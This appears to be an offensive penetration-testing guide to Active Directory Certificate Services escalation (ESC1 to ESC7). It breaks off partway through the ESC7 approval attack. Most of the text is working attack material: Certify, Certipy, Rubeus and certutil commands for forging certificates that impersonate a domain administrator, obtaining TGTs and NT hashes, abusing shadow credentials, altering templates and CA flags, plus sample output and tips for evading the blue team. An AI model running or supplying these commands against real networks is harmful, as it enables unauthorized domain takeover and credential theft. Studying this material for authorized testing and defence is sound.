# Active Directory Certificate Services (AD CS) Domain Escalation

### Overview

**Active Directory Certificate Services (AD CS)** is Microsoft's Public Key Infrastructure (PKI) implementation for Windows environments. While essential for certificate-based authentication and encryption, AD CS introduces numerous attack vectors when misconfigured. These vulnerabilities, collectively known as "Certified Pre-Owned" escalation techniques (ESC1-ESC16), allow attackers to forge certificates, impersonate privileged users, and achieve domain dominance.

**Key Concepts:**

* **Certificate Templates** - Blueprints defining certificate properties and security settings
* **Enterprise Certificate Authority (CA)** - Issues certificates based on templates
* **Extended Key Usage (EKU)** - Defines what a certificate can be used for
* **Subject Alternative Name (SAN)** - Additional identities in certificates (critical for impersonation)
* **PKINIT** - Kerberos authentication using certificates

**Why this matters:** AD CS misconfigurations provide:

* Path to Domain Admin without touching LSASS or DCs
* Certificate-based persistence (validity period = months/years)
* Difficult to detect (legitimate PKI operations)
* Multiple attack vectors (16+ known escalation techniques)
* Cross-forest compromise opportunities

**Attack advantages:**

* Certificates bypass traditional credential monitoring
* Long validity periods (persistence built-in)
* Work with Kerberos and Schannel authentication
* Difficult to revoke without proper monitoring
* Can impersonate any user (including domain admins)

**Common vulnerable configurations:**

* Templates allowing requester-supplied SANs (ESC1)
* Overly permissive enrollment rights
* Missing certificate security extensions
* Weak certificate mappings
* NTLM relay to HTTP enrollment endpoints

***

### Exploitation Workflow Summary

1. Discovery and Enumeration ├─ Identify Enterprise CAs ├─ Enumerate certificate templates ├─ Check enrollment permissions ├─ Analyze template configurations └─ Identify vulnerable templates (ESC1-ESC16)
2. Vulnerability Analysis ├─ Assess EKU configurations ├─ Check for requester-supplied SANs ├─ Identify overly permissive ACLs ├─ Review CA settings and flags └─ Map attack paths
3. Certificate Request ├─ Request certificate with malicious parameters ├─ Specify SAN for target user ├─ Include appropriate EKUs └─ Obtain signed certificate
4. Certificate Authentication ├─ Convert certificate to usable format ├─ Authenticate via Kerberos (PKINIT) ├─ Or authenticate via Schannel (LDAPS) └─ Obtain TGT or access token
5. Privilege Escalation ├─ Impersonate Domain Admin ├─ Access privileged resources ├─ Extract credentials └─ Establish persistence
6. Post-Exploitation ├─ Maintain certificate-based access ├─ Create additional backdoor certificates ├─ Modify templates for persistence └─ Lateral movement with certificates

***

### Understanding Certificate Components

#### Certificate Templates

**What are certificate templates:** Templates are blueprints stored in Active Directory that define:

* What the certificate can be used for (EKUs)
* Who can request certificates
* What information goes in the certificate
* Validity period and cryptographic requirements

**Critical template properties:**

```
msPKI-Certificate-Name-Flag - Controls if requestor can supply SAN
msPKI-Enrollment-Flag - Various enrollment restrictions
pKIExtendedKeyUsage - What certificate can authenticate
nTSecurityDescriptor - Who can enroll
msPKI-RA-Signature - If manager approval required
```

**Template versions:**

```
Version 1: Legacy templates, limited security features
Version 2: Modern templates, more granular controls
Version 3: Windows Server 2008+, additional features
Version 4: Windows Server 2012+, most secure
```

#### Extended Key Usage (EKU)

**EKUs define certificate purpose:**

**Client Authentication (1.3.6.1.5.5.7.3.2)**

```
Purpose: Authenticate clients to servers
Attack relevance: Allows domain authentication via Kerberos/Schannel
Primary target: This is what attackers need for impersonation
```

**PKINIT Client Authentication (1.3.6.1.5.2.3.4)**

```
Purpose: Kerberos authentication with certificates
Attack relevance: Specifically for obtaining Kerberos TGTs
Use case: Rubeus asktgt command
```

**Smart Card Logon (1.3.6.1.4.1.311.20.2.2)**

```
Purpose: Smart card authentication
Attack relevance: Equivalent to Client Authentication for domain auth
Common: Many default templates include this
```

**Any Purpose (2.5.29.37.0)**

```
Purpose: Certificate valid for ANY purpose
Attack relevance: Most dangerous - can do everything
ESC2: Templates with Any Purpose EKU are vulnerable
```

**Certificate Request Agent (1.3.6.1.4.1.311.20.2.1)**

```
Purpose: Request certificates on behalf of others
Attack relevance: ESC3 - enrollment agent abuse
Danger: Can impersonate any user if not restricted
```

#### Subject Alternative Name (SAN)

**Understanding SANs:** The SAN extension in certificates specifies additional identities. Active Directory prioritizes SAN over Subject DN for authentication.

**SAN formats:**

```
UPN: administrator@domain.local
DNS: dc01.domain.local
Email: admin@domain.local
SID: S-1-5-21-...-500
```

**Attack significance:** If a template allows requester to supply SAN:

```
1. Request certificate for low-privilege account
2. Specify SAN as domain admin
3. Certificate authenticates as domain admin
4. Instant privilege escalation
```

**CT\_FLAG\_ENROLLEE\_SUPPLIES\_SUBJECT:**

```
Bitmask flag in msPKI-Certificate-Name-Flag
When set: Requestor can specify SAN
Attack: ESC1 - requester-supplied SAN impersonation
```

***

### ESC1: Misconfigured Certificate Templates

#### Understanding ESC1

**ESC1 is the most common and straightforward AD CS attack.** A vulnerable template has all these conditions:

**Required conditions:**

1. ✓ Enrollment rights granted to low-privilege users
2. ✓ Manager approval not required
3. ✓ No authorized signatures needed
4. ✓ Template includes authentication EKU (Client Auth, PKINIT, Smart Card)
5. ✓ **CT\_FLAG\_ENROLLEE\_SUPPLIES\_SUBJECT** flag enabled

**Why condition 5 is critical:** This flag allows the certificate requestor to specify the Subject Alternative Name. Since AD prioritizes SAN for authentication, this allows complete impersonation.

**Attack flow:**

```
1. Low-privilege user finds vulnerable template
2. Requests certificate specifying SAN as "administrator@domain.local"
3. CA issues certificate with attacker-controlled SAN
4. Attacker authenticates as administrator using certificate
5. Domain Admin access achieved
```

#### Enumeration

**Certify enumeration:**

```cmd
Certify.exe find /vulnerable
```

**Expected output:**

```
[*] Action: Find certificate templates
[*] Using current user context
[*] Listing info about vulnerable certificate templates:

    Template Name:              VulnTemplate
    Display Name:               Vulnerable User Template
    Certificate Authorities:    DC01-CA
    Enabled:                    True
    Client Authentication:      True
    Enrollment Agent:           False
    Manager Approval:           False
    Required Signatures:        0
    Authorized Signatures Required: 0
    Validity Period:            1 year
    Enrollment Permissions
      Enrollment Rights
        DOMAIN\Domain Users       Enroll
        DOMAIN\Authenticated Users Enroll
    Certificate Name Flag:      EnrolleeSuppliesSubject
    
[!] Vulnerable Templates:        1
```

**Key indicators:**

* `Certificate Name Flag: EnrolleeSuppliesSubject` ← **CRITICAL**
* `Client Authentication: True` ← Required for domain auth
* `Enrollment Rights: Domain Users` ← You can request it
* `Manager Approval: False` ← No human intervention needed

**Certipy enumeration:**

```bash
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

**Output format:**

```
Certificate Authorities
  0
    CA Name                             : corp-DC-CA
    DNS Name                            : DC01.corp.local
    
Certificate Templates
  0
    Template Name                       : ESC1-Template
    Display Name                        : Vulnerable ESC1
    Certificate Authorities             : corp-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Enrollment Permissions
      Enrollment Rights           
        Principal                       : CORP\Domain Users
        Principal SID                   : S-1-5-21-...-513
        
[!] Vulnerabilities
    ESC1                                : Enrollee can supply SAN for any user
```

#### Exploitation

**Certify exploitation (Windows):**

```cmd
Certify.exe request /ca:dc.domain.local\DC-CA /template:VulnTemplate /altname:administrator@corp.local
```

**Parameters explained:**

* `/ca:dc.domain.local\DC-CA` - CA server and CA name
* `/template:VulnTemplate` - Vulnerable template name
* `/altname:administrator@corp.local` - SAN for impersonation (UPN format)

**Expected output:**

```
[*] Action: Request a certificate
[*] Current user context    : CORP\john
[*] No subject name specified, using current context as subject.

[*] Template                : VulnTemplate
[*] Subject                 : CN=john, OU=Users, DC=corp, DC=local
[*] AltName                 : administrator@corp.local

[*] Certificate Authority   : dc.domain.local\DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 147

[*] cert.pem                 :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2Y8HqVT...
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGMDCCBBigAwIBAgITGgA...
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

**Post-2022 SID mapping (recommended):**

```cmd
Certify.exe request /ca:dc.domain.local\DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500
```

**Parameters:**

* `/altname:administrator` - Can use sAMAccountName without domain
* `/sid:S-1-5-21-...-500` - Explicitly includes SID in certificate

**Why include SID:** Post-May 2022 patches, certificates should include the target's SID. Including it explicitly ensures compatibility.

**Alternative SAN format (otherName URL):**

```cmd
Certify.exe request /ca:dc.domain.local\DC-CA /template:VulnTemplate /altname:administrator /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-...-500
```

**Certipy exploitation (Linux):**

```bash
certipy req -username john@corp.local -password 'Passw0rd!' -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```

**Parameters:**

* `-username john@corp.local` - Current compromised user
* `-target-ip ca.corp.local` - CA server IP or hostname
* `-ca 'corp-CA'` - CA name
* `-template 'ESC1'` - Vulnerable template
* `-upn 'administrator@corp.local'` - Target user UPN for SAN

**Expected output:**

```
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 148
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-...-500'
[*] Saved certificate and private key to 'administrator.pfx'
```

#### Certificate Conversion and Authentication

**Convert PEM to PFX (if using Certify):**

```bash
# Method 1: OpenSSL
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
# Enter export password when prompted

# Method 2: Windows certutil
certutil -MergePFX cert.pem cert.pfx
```

**Authenticate with Rubeus (Windows):**

```cmd
Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:pfx_password /ptt
```

**Parameters:**

* `/user:administrator` - User to authenticate as (from SAN)
* `/certificate:administrator.pfx` - Certificate file
* `/password:pfx_password` - PFX file password
* `/ptt` - Pass-the-Ticket (inject TGT into current session)

**Expected output:**

```
[*] Action: Ask TGT

[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=john, OU=Users, DC=corp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'corp.local\administrator'
[*] Using domain controller: dc01.corp.local:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFuj...[truncated]...

[*] Action: Inject Ticket
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/corp.local
  ServiceRealm             :  CORP.LOCAL
  UserName                 :  administrator
  UserRealm                :  CORP.LOCAL
  StartTime                :  12/21/2024 10:15:00 AM
  EndTime                  :  12/21/2024 8:15:00 PM
  RenewTill                :  12/28/2024 10:15:00 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  A1B2C3D4...
```

**Authenticate with Certipy (Linux):**

```bash
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

**Expected output:**

```
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

**What you gain:**

* **TGT (Kerberos Ticket)** - Can access any domain resource
* **NT Hash** - Can be used for Pass-the-Hash attacks
* **Domain Admin Access** - Full domain control

#### LDAP Query for ESC1 Templates

**Manual enumeration via LDAP:**

```ldap
(&
  (objectclass=pkicertificatetemplate)
  (!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))
  (|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))
  (|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)
    (pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)
    (pkiextendedkeyusage=1.3.6.1.5.2.3.4)
    (pkiextendedkeyusage=2.5.29.37.0)
    (!(pkiextendedkeyusage=*)))
  (mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1)
)
```

**What this finds:**

* Templates without manager approval requirement
* No signature requirements
* Authentication EKUs present
* **CT\_FLAG\_ENROLLEE\_SUPPLIES\_SUBJECT enabled**

***

### ESC2: Any Purpose EKU

#### Understanding ESC2

**ESC2 is a variation of ESC1** where the template has **Any Purpose EKU** or **no EKU** instead of specific authentication EKUs.

**Required conditions:**

1. ✓ Enrollment rights granted to low-privilege users
2. ✓ Manager approval disabled
3. ✓ No authorized signatures required
4. ✓ Overly permissive security descriptor
5. ✓ **Any Purpose EKU (2.5.29.37.0) OR no EKU**

**Why Any Purpose is dangerous:** Any Purpose EKU means the certificate can be used for:

* Client authentication (domain auth)
* Server authentication (impersonate services)
* Code signing (sign malicious code)
* Email signing
* Any other certificate use case

**Certificates with no EKU (SubCA):**

* Act as subordinate CA certificates
* Can sign new certificates with arbitrary EKUs
* Can create certificates with any properties
* Even more powerful than Any Purpose

**Limitation:** New certificates created for domain authentication won't work unless the subordinate CA is trusted by NTAuthCertificates object (default is NOT trusted).

**However, still very dangerous:**

* Can create certs for code signing
* Can sign server authentication certificates
* Impact on SAML, AD FS, IPSec
* Potential compromise of other applications

#### Exploitation

**Same technique as ESC1:**

```bash
# Certipy
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC2-Template -upn administrator@corp.local

# Certify
Certify.exe request /ca:dc.domain.local\DC-CA /template:ESC2-Template /altname:administrator@corp.local
```

**If template is SubCA type:** Can create and sign your own certificates with any properties using the issued SubCA certificate.

#### LDAP Query for ESC2

```ldap
(&
  (objectclass=pkicertificatetemplate)
  (!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))
  (|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))
  (|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))
)
```

***

### ESC3: Enrollment Agent Templates

#### Understanding ESC3

**ESC3 abuses the Certificate Request Agent EKU** to enroll certificates on behalf of other users. This requires exploiting **two different templates** in sequence.

**Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1):**

* Also called "Enrollment Agent" in Microsoft docs
* Allows principal to enroll certificates for other users
* Acts as intermediary in certificate requests

**Attack flow:**

```
1. Attacker enrolls in "enrollment agent" template
2. Receives certificate with Certificate Request Agent EKU
3. Uses agent certificate to co-sign CSR for another user
4. Sends co-signed CSR to CA
5. CA issues certificate for the target user
6. Attacker authenticates as target user
```

**Template 1 requirements (Enrollment Agent cert):**

1. ✓ Enrollment rights granted to low-privilege users
2. ✓ Manager approval omitted
3. ✓ No authorized signature requirement
4. ✓ Overly permissive security descriptor
5. ✓ **Certificate Request Agent EKU included**

**Template 2 requirements (Target user cert):**

1. ✓ Enrollment rights granted to low-privilege users
2. ✓ Manager approval bypassed
3. ✓ Schema version 1 OR version 2+ with Application Policy requiring Certificate Request Agent
4. ✓ EKU permits domain authentication
5. ✓ **No restrictions on enrollment agents at CA level**

**Default CA setting:** Most CAs are configured to "Do not restrict enrollment agents" - extremely permissive and dangerous.

#### Exploitation

**Step 1: Request enrollment agent certificate**

```cmd
# Certify
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
```

**Expected output:**

```
[*] Template                : Vuln-EnrollmentAgent
[*] Certificate had been issued.
[*] Request ID              : 201

[*] cert.pem :
-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
...
-----END CERTIFICATE-----
```

**Convert to PFX:**

```cmd
certutil -MergePFX enrollmentcert.pem enrollmentcert.pfx
```

**Certipy equivalent:**

```bash
certipy req -username john@corp.local -password 'Passw0rd!' -target-ip ca.corp.local -ca 'corp-CA' -template 'EnrollmentAgent'
```

**Step 2: Use agent certificate to request cert on behalf of target**

```cmd
# Certify
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:password123
```

**Parameters:**

* `/template:User` - Template allowing domain authentication
* `/onbehalfof:CORP\itadmin` - Target privileged user
* `/enrollment:enrollmentcert.pfx` - Agent certificate
* `/enrollcertpwd:password123` - Agent certificate password

**Expected output:**

```
[*] Using enrollment certificate from : enrollmentcert.pfx
[*] Template                          : User
[*] On behalf of                      : CORP\itadmin
[*] Certificate had been issued.
[*] Request ID                        : 202

[*] Certificate for CORP\itadmin
```

**Certipy equivalent:**

```bash
certipy req -username john@corp.local -password 'Passw0rd!' -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
```

**Step 3: Authenticate as target user**

```cmd
# Convert to PFX if needed
certutil -MergePFX itadminenrollment.pem itadminenrollment.pfx

# Authenticate with Rubeus
Rubeus.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:password123 /ptt
```

**Certipy authentication:**

```bash
certipy auth -pfx administrator.pfx -username administrator -domain corp.local -dc-ip 172.16.19.100
```

#### CA Enrollment Agent Restrictions

**Viewing restrictions (Windows):**

```
1. Open certsrv.msc
2. Right-click CA → Properties
3. Navigate to "Enrollment Agents" tab
```

**Three restriction levels:**

```
Do not restrict enrollment agents (DEFAULT - DANGEROUS)
├─ Any principal with agent cert can enroll for anyone
├─ No restrictions on templates
└─ No restrictions on target accounts

Restrict enrollment agents (If enabled)
├─ Define who can act as enrollment agent
├─ Which templates agents can enroll in
└─ On behalf of which accounts

Default when enabled is STILL overly permissive:
- Everyone can enroll in all templates as anyone
```

***

### ESC4: Vulnerable Certificate Template Access Control

#### Understanding ESC4

**ESC4 is about ACL abuse on certificate templates themselves.** If you can modify a template's configuration, you can make it vulnerable to other ESC attacks.

**Dangerous permissions on templates:**

**Owner:**

```
- Implicit control over template object
- Can modify any template attribute
- Can make template vulnerable to ESC1, ESC2, etc.
```

**FullControl:**

```
- Complete authority over template
- Can change all security settings
- Can modify enrollment permissions
```

**WriteOwner:**

```
- Can change template's owner
- Set owner to attacker-controlled principal
- Then leverage Owner permissions
```

**WriteDACL:**

```
- Can adjust access controls
- Grant yourself FullControl
- Then make any modifications
```

**WriteProperty:**

```
- Can edit any template property
- Modify msPKI-Certificate-Name-Flag
- Enable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
- Instant ESC1 vulnerability
```

#### Enumeration

**Find principals with template edit rights:**

```cmd
# Certify
Certify.exe find /showAllPermissions

# View PKI objects and admins
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

**Expected output:**

```
[*] Enterprise CA Name            : DC01-CA
[*] DNS Hostname                  : dc01.corp.local
[*] Permissions
    Owner                         : CORP\Domain Admins
    BUILTIN\Administrators        : FullControl
    CORP\Domain Admins            : FullControl
    CORP\ESC4-User                : WriteProperty    <-- VULNERABLE

[*] Certificate Templates
    Template Name                 : ESC4-Test
    Template DistinguishedName    : CN=ESC4-Test,CN=Certificate Templates,...
    Permissions
      Owner                       : CORP\Domain Admins
      CORP\Domain Admins          : FullControl
      CORP\JohnPC                 : WriteProperty    <-- VULNERABLE
```

#### Exploitation

**Attack scenario:** User JOHN has WriteProperty on template ESC4-Test. Attack flow:

```
1. JOHN has AddKeyCredentialLink edge to JOHNPC (Shadow Credentials)
2. Use Shadow Credentials to compromise JOHNPC
3. JOHNPC has WriteProperty on ESC4-Test template
4. Modify template to make it vulnerable to ESC1
5. Request certificate with SAN impersonation
6. Authenticate as administrator
```

**Step 1: Compromise JOHNPC with Shadow Credentials**

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Expected output:**

```
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID: 12345678-1234-1234-1234-123456789012
[*] Adding Key Credential to target
[*] Successfully added Key Credential to target
[*] Authenticating with certificate
[*] Using principal: johnpc@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Got hash for 'johnpc@corp.local': aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6...
```

**Step 2: Modify template to make it vulnerable to ESC1**

```bash
certipy template -username johnpc@corp.local -password Passw0rd -template ESC4-Test -save-old
```

**Parameters:**

* `-template ESC4-Test` - Template to modify
* `-save-old` - Save original configuration for later restoration

**What this does:**

```
Modifies template to:
1. Enable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag
2. Add Client Authentication EKU
3. Grant enrollment rights to low-privilege users
4. Result: Template now vulnerable to ESC1
```

**Expected output:**

```
[*] Saved old configuration to ESC4-Test.json
[*] Updating certificate template 'ESC4-Test'
[*] Successfully updated 'ESC4-Test'
```

**Step 3: Exploit ESC1 vulnerability**

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local
```

**Step 4: Authenticate as administrator**

```bash
certipy auth -pfx administrator.pfx -username administrator -domain corp.local -dc-ip 172.16.19.100
```

**Step 5: Restore original template configuration (cleanup)**

```bash
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

**Why cleanup matters:**

* Reduces detection risk
* Prevents blue team from discovering modification
* Maintains stealth during engagement
* Shows professional operational security

***

### ESC5: Vulnerable PKI Object Access Control

#### Understanding ESC5

**ESC5 is the broader version of ESC4**, affecting not just certificate templates but the entire PKI infrastructure. Any component in the PKI hierarchy can be a target.

**Vulnerable objects:**

**1. CA Server Computer Account**

```
Attack vectors:
- S4U2Self/S4U2Proxy Kerberos delegation attacks
- Compromise via resource-based constrained delegation
- Machine account takeover

Impact:
- Control over CA server
- Issue arbitrary certificates
- Modify CA configuration
```

**2. CA RPC/DCOM Server**

```
Attack vectors:
- RPC endpoint compromise
- DCOM exploitation
- Remote code execution

Impact:
- Direct CA server control
- Certificate issuance capabilities
```

**3. PKI Container Objects**

```
Path: CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com

Includes:
- Certificate Templates container
- Certification Authorities container
- NTAuthCertificates object
- Enrollment Services Container

Attack:
- Modify NTAuthCertificates (add rogue CAs)
- Create malicious templates
- Alter CA configurations
```

**Attack principle:** If you can compromise ANY critical PKI component through weak ACLs, you can compromise the entire AD CS system.

#### Enumeration

**Identify weak ACLs on PKI objects:**

```cmd
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

**PowerShell enumeration:**

```powershell
# Get PKI configuration container
$ConfigNC = ([ADSI]"LDAP://RootDSE").configurationNamingContext

# Enumerate PKI container ACLs
Get-ADObject -Filter * -SearchBase "CN=Public Key Services,CN=Services,$ConfigNC" -Properties nTSecurityDescriptor

# Check Certificate Templates container
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigNC" -Filter * -Properties nTSecurityDescriptor
```

**Look for:**

* Non-admin users with WriteProperty
* WriteDACL permissions on PKI containers
* FullControl for low-privilege groups
* Owner set to non-admin accounts

***

### ESC6: EDITF\_ATTRIBUTESUBJECTALTNAME2

#### Understanding ESC6

**ESC6 is a CA-level misconfiguration** rather than a template issue. The **EDITF\_ATTRIBUTESUBJECTALTNAME2** flag on the CA allows anyone to specify arbitrary SANs in certificate requests, regardless of template restrictions.

**When this flag is enabled:**

```
ANY template configured for domain authentication becomes vulnerable
- Even templates without CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
- Including default "User" template
- All unprivileged users can request with custom SANs
```

**Attack significance:**

* Don't need to find vulnerable templates
* Standard templates become exploitable
* Much wider attack surface
* Often enabled by admins who don't understand impact

**Why admins enable it:**

* Support on-the-fly HTTPS certificate generation
* Deployment services need flexibility
* Lack of understanding of security implications
* Legacy applications require it

**Technical difference from ESC1:**

```
ESC1: SAN is in certificate EXTENSION
ESC6: SAN is in certificate ATTRIBUTE (Name Value Pair)

Both allow impersonation, but:
- Different technical implementation
- Different detection signatures
- ESC6 affects ALL templates
```

#### Detection

**Check if flag is enabled:**

```cmd
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

**Expected output if vulnerable:**

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA_NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags

EditFlags REG_DWORD = 0x00000140 (320)
    EDITF_REQUESTEXTENSIONLIST -- 40
    EDITF_ATTRIBUTESUBJECTALTNAME2 -- 80000  <-- VULNERABLE
```

**Alternative detection via registry:**

```cmd
reg.exe query \\CA_SERVER\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA_NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

**Certify detection:**

```cmd
Certify.exe find
```

**Expected output:**

```
[*] Enterprise CA Name            : DC01-CA
[*] DNS Hostname                  : dc01.corp.local
[*] Flags                         : EDITF_ATTRIBUTESUBJECTALTNAME2    <-- VULNERABLE
[!] CA setting EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled! Any request can specify a SAN!
```

#### Exploitation

**Certify exploitation:**

```cmd
Certify.exe request /ca:dc.domain.local\DC-CA /template:User /altname:administrator
```

**Parameters:**

* `/template:User` - Standard user template (normally not vulnerable)
* `/altname:administrator` - SAN for impersonation

**Key difference:** Using standard "User" template which normally wouldn't allow SAN specification, but CA flag overrides template restrictions.

**Certipy exploitation:**

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

**Expected output:**

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 305
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-...-500'
[*] Saved certificate and private key to 'administrator.pfx'
```

#### Configuration Management

**Enable flag (if you have domain admin):**

```cmd
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

**Disable flag (remediation):**

```cmd
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

**Requires CA service restart:**

```cmd
# Restart CertSvc service
net stop certsvc
net start certsvc
```

#### Post-May 2022 Patch Considerations

**Important security update impact:**

**After May 2022 patches:**

* New certificates contain **szOID\_NTDS\_CA\_SECURITY\_EXT** security extension
* This extension includes requester's objectSid

**For ESC1:**

```
SID in extension = SID from specified SAN
Kerberos validates SID matches certificate UPN
Works as expected
```

**For ESC6:**

```
SID in extension = Requester's actual objectSid (not from SAN!)
Mismatch: Certificate SAN says "administrator" but SID says "john"
Kerberos authentication fails (with proper certificate mapping)
```

**ESC6 now requires ESC10:** To exploit ESC6 post-May 2022, the system must be vulnerable to **ESC10 (Weak Certificate Mappings)**, which prioritizes SAN over the security extension for authentication.

**Attack chain post-patch:**

```
1. Find CA with EDITF_ATTRIBUTESUBJECTALTNAME2 enabled (ESC6)
2. Verify weak certificate mapping enabled (ESC10)
3. Request certificate with target SAN
4. Authenticate using weak mapping (ignores SID extension)
5. Impersonation succeeds
```

***

### ESC7: Vulnerable CA Access Control

#### Understanding ESC7

**ESC7 involves permissions on the Certificate Authority itself**, not templates. Two primary rights are abused:

**ManageCA (CA Administrator role):**

```
Allows:
- Modifying CA settings remotely
- Enabling/disabling certificate templates
- Toggling EDITF_ATTRIBUTESUBJECTALTNAME2 flag
- Adding/removing officers
- Restarting CA service (locally, not remotely)

Attack:
- Enable EDITF_ATTRIBUTESUBJECTALTNAME2
- Perform ESC6 attack
- Requires CA service restart (challenge)
```

**ManageCertificates (Certificate Manager/Officer role):**

```
Allows:
- Approving pending certificate requests
- Denying requests
- Revoking certificates
- Issuing failed requests

Attack:
- Bypass "Manager Approval" template protection
- Approve own malicious certificate requests
```

#### Enumeration

**View CA permissions (GUI):**

```
1. Open certsrv.msc
2. Right-click CA
3. Properties → Security tab
```

**PowerShell enumeration (PSPKI module):**

```powershell
Import-Module PSPKI

Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | Select-Object -ExpandProperty Access
```

**Expected output:**

```
Principal                : CORP\Domain Admins
AccessControlType        : Allow
Rights                   : ManageCA, ManageCertificates

Principal                : CORP\Cert-Officers
AccessControlType        : Allow
Rights                   : ManageCertificates

Principal                : CORP\ESC7-User
AccessControlType        : Allow
Rights                   : ManageCA                <-- VULNERABLE
```

#### Attack 1: ManageCA → Enable EDITF Flag

**Prerequisites:**

* ManageCA permissions on CA
* Ability to restart CA service (requires local admin on CA server)

**Step 1: Enable EDITF\_ATTRIBUTESUBJECTALTNAME2 flag**

```powershell
Import-Module PSPKI

# Get CA object
$CA = Get-CertificationAuthority -ComputerName dc.domain.local

# Enable flag
Enable-PolicyModuleFlag -PolicyModuleFlag EDITF_ATTRIBUTESUBJECTALTNAME2
```

**Alternative method:**

```cmd
certutil -config "dc.domain.local\DC-CA" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

**Step 2: Restart CA service (requires local admin)**

```cmd
# On CA server
net stop certsvc
net start certsvc
```

**Step 3: Exploit ESC6**

```cmd
Certify.exe request /ca:dc.domain.local\DC-CA /template:User /altname:administrator
```

**Limitation:** User with ManageCA can enable the flag remotely but CANNOT restart the service remotely. Must have local admin on CA server or wait for scheduled restart.

#### Attack 2: ManageCertificates → Approve Requests

**Prerequisites:**

* ManageCertificates permissions on CA
* Template requiring manager approval exists

**Step 1: Request certificate requiring approval**

```cmd
Certify.exe request /ca:dc.domain.local\DC-CA /template:ApprovalNeeded
```

**Expected output:**

```
[*] Template                : ApprovalNeeded
[*] CA Response             : The certificate is still pending.
[*] Request ID              : 336

[*] cert.pem:
-----BEGIN RSA PRIVATE KEY-----
...
